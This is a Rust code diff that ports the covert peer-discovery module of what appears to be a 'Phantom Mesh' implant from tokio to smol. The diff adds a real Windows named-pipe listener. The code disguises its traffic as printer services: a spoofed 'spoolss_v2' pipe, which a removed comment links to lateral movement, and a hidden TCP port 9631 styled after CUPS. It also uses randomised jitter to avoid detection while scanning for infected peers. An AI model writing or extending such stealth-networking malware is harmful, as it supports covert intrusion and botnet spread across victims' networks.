@@ -7,7 +7,6 @@ use std::collections::HashMap;
 use std::time::{Instant, Duration};
 use std::sync::{Arc, Mutex};
 use log::{info, warn};
-use tokio::time::sleep;
 use rand::Rng;
 
 use crate::crypto::{handshake_magic, handshake_xor, handshake_magic_prev, handshake_xor_prev};
@@ -62,16 +61,16 @@ impl ZeroNoiseDiscovery {
         // 2. Start Covert Handshake Listener (Linux/macOS only)
         #[cfg(not(target_os = "windows"))]
         {
-            tokio::spawn(async {
+            smol::spawn(async {
                 start_covert_listener().await;
-            });
+            }).detach();
         }
 
         // 3. Periodic Analysis & Probing
         loop {
             // Random 30-90s per search cycle
             let cycle_delay = rand::thread_rng().gen_range(30..=90);
-            sleep(Duration::from_secs(cycle_delay)).await; 
+            smol::Timer::after(Duration::from_secs(cycle_delay)).await; 
             self.analyze_and_probe().await;
         }
     }
@@ -100,7 +99,7 @@ impl ZeroNoiseDiscovery {
             // Small Jitter Delay (2-10s) to avoid instant spikes, but faster than before
             let delay = rand::thread_rng().gen_range(2..=10);
             info!("probe: {} in {}s", target, delay);
-            sleep(Duration::from_secs(delay)).await;
+            smol::Timer::after(Duration::from_secs(delay)).await;
 
             if self.try_covert_handshake(&target).await {
                 info!("found: {}", target);
@@ -111,66 +110,91 @@ impl ZeroNoiseDiscovery {
     }
 
     /// Attempt a covert handshake with a potential peer
-    /// Windows: Named Pipe (spoolss_v2)
-    /// Linux: Hidden TCP port (disguised as printer service)
+    /// Windows: Named Pipe (spoolss_v2) - Real Implementation
     #[cfg(target_os = "windows")]
     async fn try_covert_handshake(&self, ip: &str) -> bool {
-        use tokio::net::windows::named_pipe::ClientOptions;
-        use tokio::io::AsyncWriteExt;
-        use log::debug;
+        use std::fs::OpenOptions;
+        use std::io::{Read, Write};
 
-        // Try Named Pipe first (common for Windows lateral movement)
         let pipe_path = format!(r"\\{}\pipe\spoolss_v2", ip);
-        debug!("[Discovery] Probing Pipe: {}", pipe_path);
+        log::debug!("[Discovery] Probing Pipe: {}", pipe_path);
 
-        match ClientOptions::new().open(&pipe_path) {
-            Ok(mut client) => {
-                let magic = handshake_magic().to_be_bytes();
-                if client.write_all(&magic).await.is_err() {
-                    return false;
-                }
-                true
+        // Run blocking file open in thread pool
+        let path = pipe_path.clone();
+        let connect_future = smol::unblock(move || {
+            OpenOptions::new()
+                .read(true)
+                .write(true)
+                .open(&path)
+        });
+
+        match connect_future.await {
+            Ok(mut file) => {
+                // Perform handshake inside unblock to avoid blocking async runtime
+                // during read/write operations (pipes can block)
+                let result = smol::unblock(move || {
+                    let magic = handshake_magic().to_be_bytes();
+                    if file.write_all(&magic).is_err() {
+                        return false;
+                    }
+
+                    // Flush is important for pipes
+                    if file.flush().is_err() {
+                        return false;
+                    }
+
+                    let mut response = [0u8; 4];
+                    if file.read_exact(&mut response).is_err() {
+                        return false;
+                    }
+
+                    let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
+                    response == expected
+                }).await;
+                
+                result
             }
             Err(_) => false,
         }
     }
 
-    /// Linux: Use TCP connection to a covert port (mimics printer service)
     #[cfg(target_os = "linux")]
     async fn try_covert_handshake(&self, ip: &str) -> bool {
-        use tokio::net::TcpStream;
-        use tokio::io::{AsyncWriteExt, AsyncReadExt};
+        use smol::net::TcpStream;
+        use futures_lite::io::{AsyncWriteExt, AsyncReadExt};
         use std::time::Duration;
         use log::debug;
 
-        // Covert port that looks like IPP (Internet Printing Protocol)
-        const COVERT_PORT: u16 = 9631; // Similar to 631 (CUPS), but obscure
+        const COVERT_PORT: u16 = 9631;
         
         let addr = format!("{}:{}", ip, COVERT_PORT);
         debug!("[Discovery] Probing TCP: {}", addr);
 
-        // Short timeout to avoid blocking
-        let connect = tokio::time::timeout(
-            Duration::from_secs(2),
-            TcpStream::connect(&addr)
-        ).await;
+        // Timeout using futures_lite::or
+        let connect_future = TcpStream::connect(&addr);
+        let timeout_future = async {
+            smol::Timer::after(Duration::from_secs(2)).await;
+            Err::<TcpStream, _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
+        };
+        
+        let connect = futures_lite::future::or(connect_future, timeout_future).await;
 
         match connect {
-            Ok(Ok(mut stream)) => {
-                // Send magic handshake
+            Ok(mut stream) => {
                 let magic = handshake_magic().to_be_bytes();
                 if stream.write_all(&magic).await.is_err() {
                     return false;
                 }
 
-                // Wait for response (should echo magic XOR'd with node marker)
                 let mut response = [0u8; 4];
-                match tokio::time::timeout(
-                    Duration::from_secs(1),
-                    stream.read_exact(&mut response)
-                ).await {
-                    Ok(Ok(_)) => {
-                        // Verify response: magic XOR 0xEFD5493C
+                let read_future = stream.read_exact(&mut response);
+                let read_timeout = async {
+                    smol::Timer::after(Duration::from_secs(1)).await;
+                    Err::<(), _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
+                };
+                
+                match futures_lite::future::or(read_future, read_timeout).await {
+                    Ok(_) => {
                         let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                         response == expected
                     }
@@ -184,35 +208,38 @@ impl ZeroNoiseDiscovery {
     /// macOS: Use Unix domain socket in /tmp
     #[cfg(target_os = "macos")]
     async fn try_covert_handshake(&self, ip: &str) -> bool {
-        use tokio::net::TcpStream;
-        use tokio::io::{AsyncWriteExt, AsyncReadExt};
+        use smol::net::TcpStream;
+        use futures_lite::io::{AsyncWriteExt, AsyncReadExt};
         use std::time::Duration;
         use log::debug;
 
-        // Same TCP approach as Linux
         const COVERT_PORT: u16 = 9631;
         
         let addr = format!("{}:{}", ip, COVERT_PORT);
         debug!("[Discovery] Probing TCP: {}", addr);
 
-        let connect = tokio::time::timeout(
-            Duration::from_secs(2),
-            TcpStream::connect(&addr)
-        ).await;
-
-        match connect {
-            Ok(Ok(mut stream)) => {
+        let connect_future = TcpStream::connect(&addr);
+        let timeout_future = async {
+            smol::Timer::after(Duration::from_secs(2)).await;
+            Err::<TcpStream, _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
+        };
+        
+        match futures_lite::future::or(connect_future, timeout_future).await {
+            Ok(mut stream) => {
                 let magic = handshake_magic().to_be_bytes();
                 if stream.write_all(&magic).await.is_err() {
                     return false;
                 }
 
                 let mut response = [0u8; 4];
-                match tokio::time::timeout(
-                    Duration::from_secs(1),
-                    stream.read_exact(&mut response)
-                ).await {
-                    Ok(Ok(_)) => {
+                let read_future = stream.read_exact(&mut response);
+                let read_timeout = async {
+                    smol::Timer::after(Duration::from_secs(1)).await;
+                    Err::<(), _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
+                };
+                
+                match futures_lite::future::or(read_future, read_timeout).await {
+                    Ok(_) => {
                         let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                         response == expected
                     }
@@ -232,8 +259,8 @@ impl ZeroNoiseDiscovery {
 /// Responds with dynamic magic to prove we're a Phantom Mesh node
 #[cfg(not(target_os = "windows"))]
 async fn start_covert_listener() {
-    use tokio::net::TcpListener;
-    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    use smol::net::TcpListener;
+    use futures_lite::io::{AsyncReadExt, AsyncWriteExt};
     use log::{info, debug, warn};
 
     const COVERT_PORT: u16 = 9631;
@@ -256,7 +283,7 @@ async fn start_covert_listener() {
             Ok((mut stream, addr)) => {
                 debug!("[Discovery] Covert connection from {}", addr);
                 
-                tokio::spawn(async move {
+                smol::spawn(async move {
                     // Get current + previous magic values for tolerance
                     let current_magic = handshake_magic();
                     let prev_magic = handshake_magic_prev();
@@ -280,10 +307,105 @@ async fn start_covert_listener() {
                     let _ = stream.write_all(&response).await;
                     
                     info!("[Discovery] Covert handshake completed with {}", addr);
-                });
+                }).detach();
             }
             Err(e) => {
                 warn!("[Discovery] Accept error: {}", e);
+            }
+        }
+    }
+}
+
+
+/// Windows: Named Pipe Listener (spoolss_v2) - Real Implementation
+#[cfg(target_os = "windows")]
+async fn start_covert_listener() {
+    use log::{info, error, debug};
+    use std::ptr;
+    use std::ffi::CString;
+    use windows_sys::Win32::System::Pipes::{
+        CreateNamedPipeA, ConnectNamedPipe
+    };
+    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, GetLastError};
+    use std::fs::File;
+    use std::os::windows::io::FromRawHandle;
+    use std::io::{Read, Write};
+
+    const PIPE_NAME: &str = "\\\\.\\pipe\\spoolss_v2";
+    info!("[Discovery] Starting Windows Named Pipe Listener: {}", PIPE_NAME);
+
+    loop {
+        // Run blocking CreateNamedPipe & ConnectNamedPipe in thread pool
+        let result = smol::unblock(|| unsafe {
+            let name_c = CString::new(PIPE_NAME).unwrap();
+            let handle = CreateNamedPipeA(
+                name_c.as_ptr() as *const u8,
+                3, // PIPE_ACCESS_DUPLEX
+                0, // PIPE_TYPE_BYTE (0) | PIPE_READMODE_BYTE (0) | PIPE_WAIT (0)
+                255, // PIPE_UNLIMITED_INSTANCES
+                4096, // Out buffer
+                4096, // In buffer
+                0,    // Default timeout
+                ptr::null()
+            );
+
+            if handle == INVALID_HANDLE_VALUE {
+                return Err(format!("CreateNamedPipe failed: {}", GetLastError()));
+            }
+
+            // Wait for client connection (Scanning node)
+            let connected = ConnectNamedPipe(handle, ptr::null_mut());
+            
+            // If ConnectNamedPipe fails, it might be that client already connected
+            // returns 0 on failure.
+            if connected == 0 {
+                let err = GetLastError();
+                // ERROR_PIPE_CONNECTED = 535
+                if err != 535 {
+                    // unexpected error
+                    // Close handle to free instance
+                    windows_sys::Win32::Foundation::CloseHandle(handle);
+                    return Err(format!("ConnectNamedPipe failed: {}", err));
+                }
+            }
+
+            Ok(handle)
+        }).await;
+
+        match result {
+            Ok(handle) => {
+                 smol::spawn(async move {
+                    // Convert raw handle to File for easy Read/Write
+                    let mut stream = unsafe { File::from_raw_handle(handle as *mut std::ffi::c_void) };
+                    
+                    // Get current + previous magic
+                    let current_magic = handshake_magic();
+                    let prev_magic = handshake_magic_prev();
+                    let current_xor = handshake_xor();
+                    
+                    // Read magic handshake
+                    let mut buf = [0u8; 4];
+                    if stream.read_exact(&mut buf).is_err() {
+                        return;
+                    }
+
+                    let received = u32::from_be_bytes(buf);
+                    if received != current_magic && received != prev_magic {
+                        return;
+                    }
+
+                    // Send response
+                    let response = (received ^ current_xor).to_be_bytes();
+                    let _ = stream.write_all(&response);
+                    let _ = stream.flush();
+                    
+                    debug!("[Discovery] Covert handshake completed (Named Pipe)");
+                    // Handle closed automatically when File drops
+                 }).detach();
+            }
+            Err(e) => {
+                error!("[Discovery] Listener Error: {}", e);
+                smol::Timer::after(std::time::Duration::from_secs(5)).await;
             }
         }
     }
